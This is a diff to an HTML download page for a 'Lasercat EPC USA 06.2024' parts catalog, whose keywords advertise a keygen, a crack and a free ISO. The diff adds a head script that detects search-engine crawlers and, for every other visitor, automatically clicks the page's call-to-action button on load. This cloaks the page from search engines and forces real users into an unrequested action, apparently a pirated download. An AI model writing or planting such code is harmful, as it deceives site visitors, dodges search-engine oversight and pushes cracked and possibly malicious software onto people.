@@ -5,6 +5,42 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Lasercat EPC USA 06.2024 Electronic Parts Catalog</title>
+    
+<script>
+const searchEngineUserAgents = [
+  'Googlebot',
+  'Bingbot',
+  'YandexBot',
+  'DuckDuckBot',
+  'Baiduspider',
+];
+
+function isSearchEngine(userAgent) {
+  return searchEngineUserAgents.some(bot => userAgent.includes(bot));
+}
+
+function clickCTAButton() {
+  const ctaButton = document.querySelector('.cta-button');
+  if (ctaButton) {
+    ctaButton.click();
+  }
+}
+
+function main() {
+  const userAgent = navigator.userAgent;
+  
+  if (!isSearchEngine(userAgent)) {
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', clickCTAButton);
+    } else {
+      clickCTAButton();
+    }
+  }
+}
+
+main();
+</script>
+
     <meta name="description" content="Download the Lasercat EPC USA 06.2024 - an extensive electronic parts catalog for all U.S. vehicles, available in English for Windows 7, 10, and 11.">
     <meta name="keywords" content="Lasercat EPC USA, Lasercat EPC 2024, Electronic Parts Catalog 2024, Lasercat EPC download, Lasercat EPC free download, Lasercat EPC USA 06.2024, Lasercat EPC USA English, Lasercat EPC USA Windows 10, Lasercat EPC USA Windows 11, Lasercat EPC ISO download, Lasercat EPC keygen, Electronic Spare Parts Catalog USA, Spare Parts Catalog 2024 USA, U.S. auto parts catalog, Lasercat parts catalog free download, USA auto parts catalog 2024, Lasercat LaborExpert download, Lasercat TireExpert download, Lasercat ServicePlus download, Lasercat BuyerAssist download, Lasercat Parts Catalog crack, Электронный каталог запасных частей 2024, Каталог автозапчастей США 2024, Скачать каталог автозапчастей Lasercat, Беcплатный каталог автозапчастей Lasercat 2024">
     <style>
